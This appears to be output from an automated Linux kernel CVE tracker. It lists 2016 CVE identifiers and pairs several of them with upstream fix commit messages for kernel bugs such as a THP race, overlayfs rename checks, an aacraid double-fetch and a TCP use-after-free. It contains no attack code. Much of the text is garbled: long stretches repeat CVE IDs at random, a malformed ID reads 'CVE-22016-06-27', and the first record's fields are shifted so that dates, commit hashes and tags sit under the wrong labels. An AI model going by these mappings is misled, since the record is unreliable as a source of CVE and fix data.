CVE-2016-3951:
CVE-2016-3951:
CVE-2016-3955:
CVE-2016-3961:
CVE-2016-4440:
CVE-2016-4470:
CVE-2016-4482:
CVE-2016-4485:
CVE-2016-4486:
CVE-2016-4557:
CVE-2016-4558:
CVE-2016-4565:
CVE-2016-4569:
CVE-2016-4578:
CVE-2016-4578:
CVE-2016-4580:
CVE-2016-4581:
CVE-2016-4794:
CVE-2016-4794:
CVE-2016-4805:
CVE-2016-4913:
CVE-2016-4951:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2012-09-28:
CVE-2016-8666:
2016-09-07:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.2:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.8:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-22016-06-27:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
3.15:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
ff19f63ed47309550b47831ac39176d9910fadfe:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2016-07-08:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
9bf292bfca94694a721449e3fd752493856710f6:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
1a1a143daf84db95dd7212086042004a3abb7bc2:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
*************

*** This is a new CVE ***
This CVE has been resolved in 09a2499466dc69d1e54e8e879d4591cdd0ca17c8.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Author: Andrea Arcangeli <aarcange@redhat.com>
Date:   Fri Feb 26 15:19:28 2016 -0800

    mm: thp: fix SMP race condition between THP page fault and MADV_DONTNEED
    
    commit ad33bb04b2a6cee6c1f99fabb15cddbf93ff0433 upstream.
    
    pmd_trans_unstable()/pmd_none_or_trans_huge_or_clear_bad() were
    introduced to locklessy (but atomically) detect when a pmd is a regular
    (stable) pmd or when the pmd is unstable and can infinitely transition
    from pmd_none() and pmd_trans_huge() from under us, while only holding
    the mmap_sem for reading (for writing not).
    
    While holding the mmap_sem only for reading, MADV_DONTNEED can run from
    under us and so before we can assume the pmd to be a regular stable pmd
    we need to compare it against pmd_none() and pmd_trans_huge() in an
    atomic way, with pmd_trans_unstable().  The old pmd_trans_huge() left a
    tiny window for a race.
    
    Useful applications are unlikely to notice the difference as doing
    MADV_DONTNEED concurrently with a page fault would lead to undefined
    behavior.
    
    [js] 3.12 backport: no pmd_devmap in 3.12 yet.
    
    [akpm@linux-foundation.org: tidy up comment grammar/layout]
    Signed-off-by: Andrea Arcangeli <aarcange@redhat.com>
    Reported-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Vlastimil Babka <vbabka@suse.cz>
    Signed-off-by: Jiri Slaby <jslaby@suse.cz>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 mm/memory.c |   14 ++++++++++++--
 1 file changed, 12 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: -
CVE: 2016-09-11
Break Date: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Break Commit: 3.14.79
Break Tag: -
Linus Fix Date: 2016-09-11
Linus Commit: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Linus Tag: 3.14.79
Stable Date: -
Stable Commit: 2016-09-11
Stable Tag: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8

CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 11f3710417d026ea2f4fcf362d866342c5274185
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Mon Mar 21 17:31:44 2016 +0100

    ovl: verify upper dentry before unlink and rename
    
    Unlink and rename in overlayfs checked the upper dentry for staleness by
    verifying upper->d_parent against upperdir.  However the dentry can go
    stale also by being unhashed, for example.
    
    Expand the verification to actually look up the name again (under parent
    lock) and check if it matches the upper dentry.  This matches what the VFS
    does before passing the dentry to filesytem's unlink/rename methods, which
    excludes any inconsistency caused by overlayfs.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>

 fs/overlayfs/dir.c |   59 +++++++++++++++++++++++++++++++++-------------------
 1 file changed, 38 insertions(+), 21 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6197
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-21
Linus Commit: 11f3710417d026ea2f4fcf362d866342c5274185
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: add vfs_select_inode() helper
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/open.c              |   12 ++++--------
 include/linux/dcache.h |   12 ++++++++++++
 2 files changed, 16 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: rename: check backing inode being equal
    
    If a file is renamed to a hardlink of itself POSIX specifies that rename(2)
    should do nothing and return success.
    
    This condition is checked in vfs_rename().  However it won't detect hard
    links on overlayfs where these are given separate inodes on the overlayfs
    layer.
    
    Overlayfs itself detects this condition and returns success without doing
    anything, but then vfs_rename() will proceed as if this was a successful
    rename (detach_mounts(), d_move()).
    
    The correct thing to do is to detect this condition before even calling
    into overlayfs.  This patch does this by calling vfs_select_inode() to get
    the underlying inodes.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/namei.c |    6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6327:
CVE-2016-6327:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51093254bf879bc9ce96590400a87897c7498463
Author: Bart Van Assche <bart.vanassche@sandisk.com>
Date:   Thu Feb 11 11:03:09 2016 -0800

    IB/srpt: Simplify srpt_handle_tsk_mgmt()
    
    Let the target core check task existence instead of the SRP target
    driver. Additionally, let the target core check the validity of the
    task management request instead of the ib_srpt driver.
    
    This patch fixes the following kernel crash:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000001
    IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt]
    Oops: 0002 [#1] SMP
    Call Trace:
     [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]
     [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]
     [<ffffffff8109726f>] kthread+0xcf/0xe0
     [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0
    
    Signed-off-by: Bart Van Assche <bart.vanassche@sandisk.com>
    Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr")
    Tested-by: Alex Estrin <alex.estrin@intel.com>
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Cc: Nicholas Bellinger <nab@linux-iscsi.org>
    Cc: Sagi Grimberg <sagig@mellanox.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/ulp/srpt/ib_srpt.c |   59 +--------------------------------
 1 file changed, 1 insertion(+), 58 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6327
Break Date: 2012-11-28
Break Commit: 3e4f574857eebce60bb56d7524f3f9eaa2a126d0
Break Tag: 3.8
Linus Fix Date: 2016-02-29
Linus Commit: 51093254bf879bc9ce96590400a87897c7498463
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
